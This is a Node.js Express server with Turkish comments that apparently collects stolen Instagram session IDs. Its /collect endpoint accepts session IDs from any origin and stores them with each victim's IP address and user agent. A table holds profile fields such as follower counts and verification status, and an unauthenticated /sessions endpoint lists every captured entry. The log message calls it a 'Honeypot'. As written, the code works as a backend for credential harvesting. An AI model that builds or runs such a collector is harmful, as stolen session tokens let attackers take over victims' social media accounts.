const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();

// ---- VERİTABANI ----
const db = new sqlite3.Database('sessions.db');

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT UNIQUE,
      username TEXT DEFAULT 'unknown',
      full_name TEXT DEFAULT 'unknown',
      follower_count INTEGER DEFAULT 0,
      following_count INTEGER DEFAULT 0,
      is_private INTEGER DEFAULT 0,
      is_verified INTEGER DEFAULT 0,
      profile_pic_url TEXT DEFAULT '',
      ip_address TEXT,
      user_agent TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  console.log('✅ Database initialized');
});

// ---- MIDDLEWARE ----
app.use(express.json());
app.use(cors({ origin: '*', credentials: true }));
app.use(express.static(path.join(__dirname)));

// ---- ANA SAYFA ----
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'), (err) => {
    if (err) res.status(404).send('index.html not found');
  });
});

// ---- SESSION KAYDETME (BASİT) ----
app.post('/collect', async (req, res) => {
  const { sessionId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];

  if (!sessionId) {
    return res.status(400).json({ error: 'No session ID' });
  }

  try {
    // Direkt veritabanına kaydet, Instagram API'sini çağırma
    db.run(
      `INSERT OR REPLACE INTO sessions 
       (session_id, ip_address, user_agent, updated_at)
       VALUES (?, ?, ?, CURRENT_TIMESTAMP)`,
      [sessionId, ip || null, userAgent || null],
      function(err) {
        if (err) {
          console.error('❌ DB error:', err.message);
          return res.status(500).json({ error: err.message });
        }
        console.log(`✅ Session saved: ${sessionId} from ${ip}`);
        res.json({ success: true, sessionId });
      }
    );
  } catch (err) {
    console.error('❌ Collect error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ---- TÜM SESSION'LARI LİSTELE ----
app.get('/sessions', (req, res) => {
  db.all('SELECT * FROM sessions ORDER BY updated_at DESC', (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
    } else {
      res.json(rows);
    }
  });
});

// ---- PING ----
app.get('/ping', (req, res) => res.json({ ok: true }));

// ---- SERVER BAŞLAT ----
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Honeypot running on port ${PORT}`);
  console.log(`📊 Sessions: http://localhost:${PORT}/sessions`);
});
